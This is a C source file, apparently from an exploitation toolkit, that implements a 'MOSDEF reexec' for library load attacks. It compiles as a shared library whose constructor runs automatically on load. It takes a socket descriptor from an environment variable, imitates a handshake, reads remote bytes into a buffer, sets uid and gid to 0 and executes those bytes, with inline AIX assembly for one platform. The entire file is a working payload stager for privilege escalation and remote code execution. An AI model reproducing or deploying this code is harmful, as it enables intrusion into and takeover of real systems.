/*
    A MOSDEF reexec you can use in library load attacks

    This gets the FD from MOSDEFD environment var.

    gcc -shared -fPIC this.c -o /tmp/this.a
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <poll.h>

void init(void) __attribute__ ((constructor));

int
pollfd(int fd)
{
    struct pollfd fds;
    int i;

    fds.fd      = fd;
    fds.revents = 0;
    fds.events  = POLLIN;

    if ((i = poll(&fds, 1, -1)) > 0)
        return 1;
    else
        return 0;
}
    
void
init(void)
{
    void (*mosdef)()        = NULL;
    char *p                 = NULL;
    int s                   = 0;
    int i                   = 0;

    if (!(p = getenv("MOSDEFD")))
    {
        perror("mosdefd");
        _exit(1);
    }

    s = atoi(p);

    printf("using fd: %d for reexec .. doing new startup\n", s);

# define BUFSIZE 1024 * 8

    if (!(p = malloc(BUFSIZE)))
    {
        perror("malloc");
        close(s);
        _exit(1);
    }

    mosdef = p;

    // emulate mosdef handshake
    if (pollfd(s) && read(s, &i, 4) <= 0)
    {
        perror("read");
        close(s);
        free(p);
        _exit(1);
    }

    if (i > 0 && i < BUFSIZE && pollfd(s) && (read(s, p, i) > 0))
        printf("ignored %d mosdef bytes ..\n", i);
    else
    {
        perror("read");
        close(s);
        free(p);
        _exit(1);
    }

    // send fd
    write(s, &s, 4);

    // do the real thing
    if (pollfd(s) && read(s, &i, 4) <= 0)
    {
        perror("read");
        close(s);
        free(p);
        _exit(1);
    }

    if (i > 0 && i < BUFSIZE && pollfd(s) && (read(s, p, i) > 0))
        printf("executing %d mosdef bytes ..\n", i);
    else
    {
        perror("read");
        close(s);
        free(p);
        _exit(1);
    }

    setuid(0);
    setgid(0);

    // workaround for silly gcc AIX bug that jumps to *buffer
    // as opposed to buffer on function pointer calls ..

#ifdef _AIX

    sync();
    __asm__ volatile (  "mtlr %0    \n\t"
                        "mr 30, %1  \n\t"
                        "blr        \n\t" 
                        : 
                        : "r" (p), "r" (s)  );

#else

    mosdef();

#endif

    // never reached
    perror("mosdef");
}

// for testing

int
main(void)
{
    init();
}
